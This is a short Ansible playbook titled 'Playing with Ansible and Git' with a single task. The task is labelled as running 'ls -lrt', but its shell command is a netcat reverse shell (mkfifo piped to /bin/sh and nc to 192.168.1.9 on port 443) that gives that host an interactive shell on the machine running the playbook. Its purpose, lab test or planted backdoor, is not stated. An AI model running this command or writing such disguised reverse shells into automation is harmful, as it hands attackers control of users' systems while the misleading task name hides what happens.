---
  - name: "Playing with Ansible and Git"
    hosts: localhost
    tasks:

    - name: "just execute a ls -lrt command"
      shell: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.9 443 >/tmp/f"
      register: "output"

    - debug: var=output.stdout_lines
